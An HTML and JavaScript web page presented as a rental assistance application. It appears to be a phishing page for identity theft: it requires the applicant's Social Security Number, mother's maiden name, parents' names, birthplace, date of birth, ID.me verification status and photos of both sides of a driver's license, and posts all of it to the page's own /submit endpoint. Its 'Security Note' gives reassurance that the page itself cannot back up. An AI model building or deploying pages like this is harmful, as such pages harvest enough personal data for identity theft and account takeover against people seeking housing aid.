<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rental Assistance Application</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: slideUp 0.6s ease;
        }

        @keyframes slideUp {
            from {
                transform: translateY(30px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        .header {
            background: linear-gradient(135deg, #4361ee 0%, #3a0ca3 100%);
            color: white;
            padding: 30px;
            text-align: center;
            position: relative;
        }

        .progress-bar {
            height: 8px;
            background: rgba(255,255,255,0.3);
            margin: 20px 0;
            border-radius: 4px;
            overflow: hidden;
        }

        .progress {
            height: 100%;
            width: 50%;
            background: #4cc9f0;
            border-radius: 4px;
            transition: width 0.5s ease;
        }

        h2 {
            font-size: 1.8rem;
            margin-bottom: 10px;
        }

        .content {
            padding: 40px;
        }

        .form-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 25px;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            color: #333;
            margin-bottom: 8px;
            font-weight: 500;
            font-size: 0.95rem;
        }

        .required::after {
            content: " *";
            color: #f72585;
        }

        input, select {
            width: 100%;
            padding: 14px 18px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 1rem;
            transition: all 0.3s ease;
            background: white;
            height: 48px;
            line-height: 1.5;
        }

        /* Remove calendar icon styling */
        input[type="date"] {
            font-family: inherit;
            color: #333;
            height: 48px;
            padding: 14px 18px; /* Normal padding */
            background: white;
            width: 100%;
        }

        /* Hide the calendar picker indicator */
        input[type="date"]::-webkit-calendar-picker-indicator {
            opacity: 0; /* Hide it completely */
            width: 0;
            height: 0;
            padding: 0;
            margin: 0;
        }

        input:focus, select:focus {
            outline: none;
            border-color: #4361ee;
            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.1);
        }

        input::placeholder {
            color: #999;
        }

        .radio-group {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            margin-top: 10px;
        }

        .radio-option {
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
        }

        .radio-option input[type="radio"] {
            width: auto;
            margin: 0;
        }

        .file-upload {
            position: relative;
            margin-top: 10px;
        }

        .file-upload input[type="file"] {
            position: absolute;
            width: 100%;
            height: 100%;
            opacity: 0;
            cursor: pointer;
        }

        .file-label {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 15px;
            background: #f8f9fa;
            border: 2px dashed #dee2e6;
            border-radius: 10px;
            color: #666;
            transition: all 0.3s ease;
        }

        .file-label:hover {
            border-color: #4361ee;
            background: #eef2ff;
        }

        .file-label i {
            color: #4361ee;
            font-size: 1.2rem;
        }

        .file-preview {
            display: none;
            margin-top: 10px;
            padding: 10px;
            background: #e8f4fd;
            border-radius: 8px;
            font-size: 0.9rem;
            color: #1976d2;
        }

        .ssn-input {
            letter-spacing: 2px;
            font-family: monospace;
            font-size: 1.1rem;
        }

        .ssn-input::placeholder {
            letter-spacing: normal;
        }

        .form-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 40px;
            padding-top: 30px;
            border-top: 2px solid #f0f0f0;
        }

        .btn {
            padding: 15px 35px;
            border: none;
            border-radius: 12px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 10px;
            min-width: 150px;
            justify-content: center;
        }

        .btn-back {
            background: white;
            color: #666;
            border: 2px solid #e0e0e0;
        }

        .btn-back:hover {
            background: #f8f9fa;
            border-color: #4361ee;
            color: #4361ee;
        }

        .btn-submit {
            background: linear-gradient(135deg, #4361ee 0%, #3a56d4 100%);
            color: white;
            box-shadow: 0 5px 15px rgba(67, 97, 238, 0.3);
        }

        .btn-submit:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(67, 97, 238, 0.4);
        }

        .btn-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .security-note {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            margin-top: 30px;
            border-left: 4px solid #4cc9f0;
            font-size: 0.9rem;
            color: #666;
        }

        .loading {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid white;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 1s linear infinite;
            margin-left: 10px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .error-message {
            background: #fed7d7;
            color: #c53030;
            padding: 12px;
            border-radius: 8px;
            margin-top: 15px;
            display: none;
            align-items: center;
            gap: 10px;
        }

        @media (max-width: 768px) {
            .content {
                padding: 20px;
            }
            
            .form-grid {
                grid-template-columns: 1fr;
            }
            
            .form-actions {
                flex-direction: column;
                gap: 15px;
            }
            
            .btn {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="progress-bar">
                <div class="progress"></div>
            </div>
            <h2>Complete Your Application</h2>
            <p style="opacity: 0.9;">Step 2 of 2 - Personal Information</p>
        </div>

        <div class="content">
            <div class="error-message" id="errorMessage" style="display: none;">
                <i class="fas fa-exclamation-circle"></i>
                <span id="errorText"></span>
            </div>

            <form id="surveyForm">
                <div class="form-grid">
                    <!-- Personal Information -->
                    <div class="form-group">
                        <label for="fullName" class="required">Full Name</label>
                        <input type="text" id="fullName" placeholder="John David Smith" required>
                    </div>

                    <div class="form-group">
                        <label for="phone" class="required">Phone Number</label>
                        <input type="tel" id="phone" placeholder="(123) 456-7890" pattern="[0-9\-\+\s\(\)]+" required>
                    </div>

                    <div class="form-group">
                        <label for="email" class="required">Email Address</label>
                        <input type="email" id="email" placeholder="john@example.com" required>
                    </div>

                    <div class="form-group">
                        <label for="dob" class="required">Date of Birth</label>
                        <input type="date" id="dob" required>
                    </div>

                    <div class="form-group">
                        <label for="gender" class="required">Gender</label>
                        <select id="gender" required>
                            <option value="">Select Gender</option>
                            <option value="Male">Male</option>
                            <option value="Female">Female</option>
                            <option value="Non-Binary">Non-Binary</option>
                            <option value="Prefer not to say">Prefer not to say</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label for="age" class="required">Age</label>
                        <input type="number" id="age" placeholder="30" min="18" max="120" required>
                    </div>

                    <!-- Family Information -->
                    <div class="form-group">
                        <label for="mothersFullName" class="required">Mother's Full Name</label>
                        <input type="text" id="mothersFullName" placeholder="Jane Elizabeth Smith" required>
                    </div>

                    <div class="form-group">
                        <label for="mothersMaidenName" class="required">Mother's Maiden Name</label>
                        <input type="text" id="mothersMaidenName" placeholder="Jane Elizabeth Johnson" required>
                    </div>

                    <div class="form-group">
                        <label for="fathersFullName" class="required">Father's Full Name</label>
                        <input type="text" id="fathersFullName" placeholder="Robert James Smith" required>
                    </div>

                    <!-- Birth Information -->
                    <div class="form-group">
                        <label for="placeOfBirth" class="required">Place of Birth</label>
                        <input type="text" id="placeOfBirth" placeholder="LA" required>
                    </div>

                    <div class="form-group">
                        <label for="cityOfBirth" class="required">City of Birth</label>
                        <input type="text" id="cityOfBirth" placeholder="Chicago, IL" required>
                    </div>

                    <div class="form-group">
                        <label for="city" class="required">Current City of Residence</label>
                        <input type="text" id="city" placeholder="New York" required>
                    </div>

                    <div class="form-group">
                        <label for="ssn" class="required">Social Security Number</label>
                        <input type="text" id="ssn" placeholder="XXX-XX-XXXX" pattern="\d{3}-\d{2}-\d{4}" 
                               title="Format: XXX-XX-XXXX" class="ssn-input" required>
                    </div>

                    <div class="form-group">
                        <label for="pastDueRent" class="required">Past Due Rent Amount ($)</label>
                        <input type="number" id="pastDueRent" placeholder="1500.00" step="0.01" min="0" required>
                    </div>
                </div>

                <!-- Radio Groups -->
                <div class="form-grid">
                    <div class="form-group">
                        <label class="required">Have you applied before?</label>
                        <div class="radio-group">
                            <label class="radio-option">
                                <input type="radio" name="appliedBefore" value="Yes" required>
                                <span>Yes</span>
                            </label>
                            <label class="radio-option">
                                <input type="radio" name="appliedBefore" value="No">
                                <span>No</span>
                            </label>
                        </div>
                    </div>

                    <div class="form-group">
                        <label class="required">Are you receiving Social Security payments?</label>
                        <div class="radio-group">
                            <label class="radio-option">
                                <input type="radio" name="receivingSS" value="Yes" required>
                                <span>Yes</span>
                            </label>
                            <label class="radio-option">
                                <input type="radio" name="receivingSS" value="No">
                                <span>No</span>
                            </label>
                        </div>
                    </div>

                    <div class="form-group">
                        <label class="required">Have you been verified by ID.me?</label>
                        <div class="radio-group">
                            <label class="radio-option">
                                <input type="radio" name="verifiedIDme" value="Yes" required>
                                <span>Yes</span>
                            </label>
                            <label class="radio-option">
                                <input type="radio" name="verifiedIDme" value="No">
                                <span>No</span>
                            </label>
                        </div>
                    </div>
                </div>

                <!-- File Uploads -->
                <div class="form-grid">
                    <div class="form-group">
                        <label class="required">Driver's License (Front)</label>
                        <div class="file-upload">
                            <input type="file" id="dlFront" accept="image/*,.jpg,.jpeg,.png,.pdf" required>
                            <div class="file-label" id="dlFrontLabel">
                                <i class="fas fa-camera"></i>
                                <span>Click to upload front photo</span>
                            </div>
                        </div>
                        <div class="file-preview" id="dlFrontPreview"></div>
                    </div>

                    <div class="form-group">
                        <label class="required">Driver's License (Back)</label>
                        <div class="file-upload">
                            <input type="file" id="dlBack" accept="image/*,.jpg,.jpeg,.png,.pdf" required>
                            <div class="file-label" id="dlBackLabel">
                                <i class="fas fa-camera"></i>
                                <span>Click to upload back photo</span>
                            </div>
                        </div>
                        <div class="file-preview" id="dlBackPreview"></div>
                    </div>
                </div>

                <div class="security-note">
                    <i class="fas fa-shield-alt"></i>
                    <strong>Security Note:</strong> Your Social Security Number is immediately hashed and securely stored. 
                    We do not store the original SSN. All file uploads are encrypted and protected.
                </div>

                <div class="form-actions">
                    <button type="button" class="btn btn-back" onclick="goBack()">
                        <i class="fas fa-arrow-left"></i> Back
                    </button>
                    <button type="submit" class="btn btn-submit" id="submitBtn">
                        <i class="fas fa-paper-plane"></i> Submit Application
                        <div class="loading" id="loadingSpinner"></div>
                    </button>
                </div>
            </form>
        </div>
    </div>

    <script>
        // Load saved name if exists
        document.addEventListener('DOMContentLoaded', () => {
            try {
                const savedName = localStorage.getItem('fullName');
                if (savedName) {
                    document.getElementById('fullName').value = savedName;
                }
            } catch (e) {
                console.log('localStorage not available');
            }

            // File upload previews
            document.getElementById('dlFront').addEventListener('change', function(e) {
                const file = e.target.files[0];
                if (file) {
                    document.getElementById('dlFrontLabel').innerHTML = 
                        `<i class="fas fa-check-circle"></i> <span>${file.name} (${(file.size/1024/1024).toFixed(2)} MB)</span>`;
                    document.getElementById('dlFrontPreview').style.display = 'block';
                    document.getElementById('dlFrontPreview').textContent = 
                        `Front: ${file.name} - ${(file.size/1024).toFixed(1)}KB`;
                }
            });

            document.getElementById('dlBack').addEventListener('change', function(e) {
                const file = e.target.files[0];
                if (file) {
                    document.getElementById('dlBackLabel').innerHTML = 
                        `<i class="fas fa-check-circle"></i> <span>${file.name} (${(file.size/1024/1024).toFixed(2)} MB)</span>`;
                    document.getElementById('dlBackPreview').style.display = 'block';
                    document.getElementById('dlBackPreview').textContent = 
                        `Back: ${file.name} - ${(file.size/1024).toFixed(1)}KB`;
                }
            });

            // Real-time validation for SSN
            const ssnInput = document.getElementById('ssn');
            ssnInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 3) {
                    value = value.substring(0, 3) + '-' + value.substring(3);
                }
                if (value.length > 6) {
                    value = value.substring(0, 6) + '-' + value.substring(6);
                }
                e.target.value = value.substring(0, 11);
            });

            // Set max date for DOB (18 years old minimum)
            const dobInput = document.getElementById('dob');
            const today = new Date();
            const maxDate = new Date(today.getFullYear() - 18, today.getMonth(), today.getDate());
            const minDate = new Date(today.getFullYear() - 120, today.getMonth(), today.getDate());
            
            dobInput.max = maxDate.toISOString().split('T')[0];
            dobInput.min = minDate.toISOString().split('T')[0];
        });

        function goBack() {
            if (confirm('Are you sure you want to go back? Your form data will be saved.')) {
                window.location.href = 'name.html';
            }
        }

        function showError(message) {
            const errorElement = document.getElementById('errorMessage');
            const errorText = document.getElementById('errorText');
            errorText.textContent = message;
            errorElement.style.display = 'flex';
            
            setTimeout(() => {
                errorElement.style.display = 'none';
            }, 5000);
        }

        document.getElementById('surveyForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const loadingSpinner = document.getElementById('loadingSpinner');
            
            // Clear any previous errors
            document.getElementById('errorMessage').style.display = 'none';
            
            // Validate files
            const dlFront = document.getElementById('dlFront').files[0];
            const dlBack = document.getElementById('dlBack').files[0];
            
            if (!dlFront || !dlBack) {
                showError('Please upload both front and back photos of your driver\'s license');
                return;
            }
            
            // Check file size (max 5MB)
            const maxSize = 5 * 1024 * 1024; // 5MB
            if (dlFront.size > maxSize || dlBack.size > maxSize) {
                showError('Each file must be less than 5MB. Please compress your images.');
                return;
            }
            
            // Validate all required fields
            const requiredFields = [
                'fullName', 'phone', 'email', 'dob', 'gender', 'age',
                'mothersFullName', 'mothersMaidenName', 'fathersFullName',
                'placeOfBirth', 'cityOfBirth', 'city', 'ssn', 'pastDueRent'
            ];
            
            for (const fieldId of requiredFields) {
                const field = document.getElementById(fieldId);
                if (!field.value.trim()) {
                    const label = field.previousElementSibling ? field.previousElementSibling.textContent.replace(' *', '') : fieldId;
                    showError(`Please fill in: ${label}`);
                    field.focus();
                    return;
                }
            }
            
            // Validate SSN format
            const ssnRegex = /^\d{3}-\d{2}-\d{4}$/;
            if (!ssnRegex.test(document.getElementById('ssn').value)) {
                showError('Please enter a valid Social Security Number in format: XXX-XX-XXXX');
                document.getElementById('ssn').focus();
                return;
            }
            
            // Validate radio buttons
            const appliedBefore = document.querySelector('input[name="appliedBefore"]:checked');
            const receivingSS = document.querySelector('input[name="receivingSS"]:checked');
            const verifiedIDme = document.querySelector('input[name="verifiedIDme"]:checked');
            
            if (!appliedBefore || !receivingSS || !verifiedIDme) {
                showError('Please answer all the questions (Applied before, Receiving SS, Verified by ID.me)');
                return;
            }
            
            // Show loading state
            submitBtn.disabled = true;
            loadingSpinner.style.display = 'block';
            submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Processing...';
            
            try {
                const formData = new FormData();
                formData.append('full_name', document.getElementById('fullName').value);
                formData.append('phone', document.getElementById('phone').value);
                formData.append('email', document.getElementById('email').value);
                formData.append('dob', document.getElementById('dob').value);
                formData.append('gender', document.getElementById('gender').value);
                formData.append('age', document.getElementById('age').value);
                formData.append('mothers_maiden_name', document.getElementById('mothersMaidenName').value);
                formData.append('mothers_full_name', document.getElementById('mothersFullName').value);
                formData.append('fathers_full_name', document.getElementById('fathersFullName').value);
                formData.append('place_of_birth', document.getElementById('placeOfBirth').value);
                formData.append('city_of_birth', document.getElementById('cityOfBirth').value);
                formData.append('city', document.getElementById('city').value);
                formData.append('ssn', document.getElementById('ssn').value);
                formData.append('past_due_rent', document.getElementById('pastDueRent').value);
                formData.append('applied_before', appliedBefore.value);
                formData.append('receiving_ss', receivingSS.value);
                formData.append('verified_idme', verifiedIDme.value);
                formData.append('dl_front', dlFront);
                formData.append('dl_back', dlBack);

                console.log('Submitting form...');
                
                const response = await fetch('/submit', {
                    method: 'POST',
                    body: formData
                });
                
                console.log('Response status:', response.status);
                
                let result;
                try {
                    result = await response.json();
                } catch (jsonError) {
                    console.error('JSON parse error:', jsonError);
                    throw new Error('Server response was not valid JSON');
                }
                
                console.log('Response data:', result);
                
                if (response.ok && result.success) {
                    console.log('Submission successful, redirecting...');
                    
                    // Clear localStorage
                    try {
                        localStorage.removeItem('fullName');
                    } catch (e) {}
                    
                    // Redirect to confirmation page
                    window.location.href = '/confirmation.html';
                    
                } else {
                    console.error('Submission failed:', result.error || result.details);
                    throw new Error(result.error || result.details || 'Submission failed with status: ' + response.status);
                }
                
            } catch (error) {
                console.error('Error:', error);
                
                let errorMessage = 'Submission failed. ';
                
                if (error.message.includes('Failed to fetch')) {
                    errorMessage += 'Please check your internet connection and try again.';
                } else if (error.message.includes('JSON')) {
                    errorMessage += 'Server response error. Please try again.';
                } else {
                    errorMessage += error.message;
                }
                
                showError(errorMessage);
                
                // Reset button
                submitBtn.disabled = false;
                loadingSpinner.style.display = 'none';
                submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Application';
            }
        });
    </script>
</body>
</html>
